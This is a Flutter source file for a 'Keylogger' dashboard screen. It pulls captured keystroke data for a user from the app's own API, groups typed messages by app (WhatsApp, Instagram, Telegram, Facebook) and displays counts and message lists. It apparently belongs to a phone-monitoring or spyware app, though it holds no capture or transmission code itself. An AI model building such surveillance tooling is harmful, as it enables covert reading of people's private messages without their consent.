import 'package:flutter/material.dart';
import '../../apis/get.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:flutter_animate/flutter_animate.dart';
import 'package:collection/collection.dart';

class KeyloggerScreen extends StatefulWidget {
  final String username;

  const KeyloggerScreen({Key? key, required this.username}) : super(key: key);

  @override
  _KeyloggerScreenState createState() => _KeyloggerScreenState();
}

class _KeyloggerScreenState extends State<KeyloggerScreen> {
  late Future<List<Map<String, dynamic>>> _futureData;
  String selectedApp = '';

  @override
  void initState() {
    super.initState();
    _futureData = _loadKeyloggerData();
  }

  Future<List<Map<String, dynamic>>> _loadKeyloggerData() async {
    final rawData = await fetchModuleData(
      module: 'keylogger',
      userId: widget.username,
    );

    if (rawData == null || rawData is! List) return [];

    return rawData.expand<Map<String, dynamic>>((entry) {
      return (entry['data'] as List).map(
        (e) => {
          'app': e['app'],
          'messages': e['messages'],
          'fetchedTime': e['fetched time'],
        },
      );
    }).toList();
  }

  void refresh() {
    setState(() {
      _futureData = _loadKeyloggerData();
    });
  }

  Map<String, List<String>> groupMessagesByApp(List<Map<String, dynamic>> data) {
    final grouped = <String, List<String>>{};
    for (var item in data) {
      final app = item['app'] as String;
      final messages = List<String>.from(item['messages']);
      grouped.putIfAbsent(app, () => []).addAll(messages);
    }
    return grouped;
  }

  Icon _getAppIcon(String app) {
    final isDark = Theme.of(context).brightness == Brightness.dark;
    return Icon(
      switch (app.toLowerCase()) {
        'whatsapp' => FontAwesomeIcons.whatsapp,
        'instagram' => FontAwesomeIcons.instagram,
        'telegram' => FontAwesomeIcons.telegram,
        'facebook' => FontAwesomeIcons.facebook,
        _ => Icons.smartphone,
      },
      color: isDark ? Colors.white : Colors.black,
    );
  }

  Widget _summaryCard({
    required String title,
    required String subtitle,
    required IconData icon,
    required int value,
    required bool isPositive,
    required bool isDark,
  }) {
    return Container(
      margin: const EdgeInsets.symmetric(vertical: 8),
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(16),
        color: isDark ? Colors.grey.shade900 : Colors.white,
        boxShadow: [
          if (!isDark) BoxShadow(color: Colors.black26, blurRadius: 6),
        ],
      ),
      child: Row(
        children: [
          Icon(icon, size: 36, color: isDark ? Colors.white : Colors.black),
          const SizedBox(width: 16),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(title,
                    style: TextStyle(
                      color: isDark ? Colors.white : Colors.black,
                      fontWeight: FontWeight.bold,
                      fontSize: 16,
                    )),
                const SizedBox(height: 4),
                Text(
                  subtitle,
                  style: TextStyle(
                    color: isDark ? Colors.white60 : Colors.black54,
                  ),
                ),
              ],
            ),
          ),
          Icon(
            isPositive ? Icons.arrow_upward : Icons.arrow_downward,
            color: isPositive ? Colors.green : Colors.red,
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final isDark = Theme.of(context).brightness == Brightness.dark;

    return Scaffold(
      extendBodyBehindAppBar: true,
appBar: AppBar(
  automaticallyImplyLeading: false,
  backgroundColor: Colors.transparent,
  elevation: 0,
  title: Container(
    padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
    decoration: BoxDecoration(
      color: Theme.of(context).brightness == Brightness.dark
          ? Colors.grey.shade900
          : Colors.white,
      borderRadius: BorderRadius.circular(20),
      boxShadow: Theme.of(context).brightness == Brightness.dark
          ? null
          : [
              BoxShadow(
                color: Colors.black12,
                blurRadius: 4,
                offset: Offset(0, 2),
              ),
            ],
    ),
    child: Text(
      'Keylogger',
      style: TextStyle(
        fontSize: 18,
        fontWeight: FontWeight.bold,
        color: Theme.of(context).brightness == Brightness.dark
            ? Colors.white
            : Colors.black,
      ),
    ),
  ),
  actions: [
    IconButton(
      icon: const Icon(Icons.refresh),
      onPressed: refresh, // Ensure you define the `refresh` method
      color: Colors.white, // Optional: ensures it's visible on background
    ),
  ],
),

      body: Container(
        decoration: BoxDecoration(
          gradient: isDark
              ? const LinearGradient(colors: [Colors.black, Colors.black])
              : const LinearGradient(
                  begin: Alignment.bottomLeft,
                  end: Alignment.topRight,
                  colors: [
                    Color(0xFF0090FF),
                    Color(0xFF15D6A6),
                    Color(0xFF123A5B),
                  ],
                ),
        ),
        child: FutureBuilder<List<Map<String, dynamic>>>(
          future: _futureData,
          builder: (context, snapshot) {
            if (snapshot.connectionState == ConnectionState.waiting) {
              return const Center(
                child: CircularProgressIndicator(color: Colors.white),
              );
            } else if (snapshot.hasError ||
                snapshot.data == null ||
                snapshot.data!.isEmpty) {
              return const Center(
                child: Text(
                  "No keylogger data available",
                  style: TextStyle(color: Colors.white),
                ),
              );
            }

            final groupedData = groupMessagesByApp(snapshot.data!);
            final todayKeystrokes = groupedData.values
                .fold<int>(0, (sum, list) => sum + list.length);
            final highestApp = groupedData.entries.reduce(
              (a, b) => a.value.length > b.value.length ? a : b,
            );

            return SingleChildScrollView(
              padding: const EdgeInsets.fromLTRB(16, kToolbarHeight + 18, 16, 18),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  _summaryCard(
                    title: "No. of Keystrokes Today",
                    subtitle: "$todayKeystrokes keystrokes",
                    icon: Icons.keyboard_alt,
                    value: todayKeystrokes,
                    isPositive: todayKeystrokes > 100,
                    isDark: isDark,
                  ).animate().fadeIn().slideY(begin: 0.2),
                  _summaryCard(
                    title: "Highest Keystroke App",
                    subtitle:
                        "${highestApp.key} - ${highestApp.value.length} keys",
                    icon: Icons.bar_chart,
                    value: highestApp.value.length,
                    isPositive: highestApp.value.length > 100,
                    isDark: isDark,
                  ).animate().fadeIn().slideY(begin: 0.2, delay: 200.ms),
                  const SizedBox(height: 16),

                  // App selector
                  Container(
                    padding: const EdgeInsets.all(12),
                    margin: const EdgeInsets.symmetric(vertical: 5),
                    decoration: BoxDecoration(
                      color: isDark ? Colors.grey[900] : Colors.white,
                      borderRadius: BorderRadius.circular(16),
                      boxShadow: [
                        if (!isDark) BoxShadow(color: Colors.black26, blurRadius: 5)
                      ],
                    ),
                    child: Row(
                      children: [
                        Text(
                          "Select App:",
                          style: TextStyle(
                            color: isDark ? Colors.white : Colors.black,
                          ),
                        ),
                        const SizedBox(width: 12),
                        DropdownButton<String>(
                          dropdownColor: isDark ? Colors.grey[900] : Colors.white,
                          style: TextStyle(
                            color: isDark ? Colors.white : Colors.black,
                          ),
                          value: selectedApp.isEmpty ? null : selectedApp,
                          hint: Text(
                            "All Apps",
                            style: TextStyle(
                              color:
                                  isDark ? Colors.white70 : Colors.black54,
                            ),
                          ),
                          items: groupedData.keys
                              .map((app) => DropdownMenuItem<String>(
                                    value: app,
                                    child: Text(app),
                                  ))
                              .toList(),
                          onChanged: (value) {
                            setState(() {
                              selectedApp = value ?? '';
                            });
                          },
                        ),
                      ],
                    ),
                  ),

                  const SizedBox(height: 8),
                  ...groupedData.entries.map((entry) {
                    if (selectedApp.isNotEmpty && selectedApp != entry.key) {
                      return const SizedBox.shrink();
                    }

                    return Container(
                      padding: const EdgeInsets.all(8),
                      margin: const EdgeInsets.only(bottom: 12),
                      decoration: BoxDecoration(
                        color: isDark ? Colors.grey[900] : Colors.white,
                        borderRadius: BorderRadius.circular(16),
                        boxShadow: [
                          if (!isDark)
                            BoxShadow(color: Colors.black26, blurRadius: 4)
                        ],
                      ),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Row(
                            children: [
                              _getAppIcon(entry.key),
                              const SizedBox(width: 10),
                              Text(
                                entry.key,
                                style: TextStyle(
                                  color: isDark ? Colors.white : Colors.black,
                                  fontWeight: FontWeight.bold,
                                ),
                              ),
                            ],
                          ),
                          const SizedBox(height: 6),
                          ...entry.value.mapIndexed((i, msg) {
                            return ListTile(
                              contentPadding:
                                  const EdgeInsets.symmetric(horizontal: 4),
                              leading: Icon(
                                Icons.keyboard,
                                color: isDark ? Colors.white : Colors.black,
                              ),
                              title: Text(
                                msg,
                                style: TextStyle(
                                  color: isDark
                                      ? Colors.white70
                                      : Colors.black87,
                                ),
                              ),
                            )
                                .animate()
                                .fadeIn(duration: 300.ms, delay: (i * 30).ms)
                                .slideX(begin: 0.05);
                          }),
                        ],
                      ),
                    );
                  }).toList(),
                ],
              ),
            );
          },
        ),
      ),
      floatingActionButton: FloatingActionButton(
        onPressed: refresh,
        backgroundColor: isDark ? Colors.grey[850] : Colors.white,
        child: Icon(Icons.refresh,
            color: isDark ? Colors.white : Colors.black),
      ),
    );
  }
}
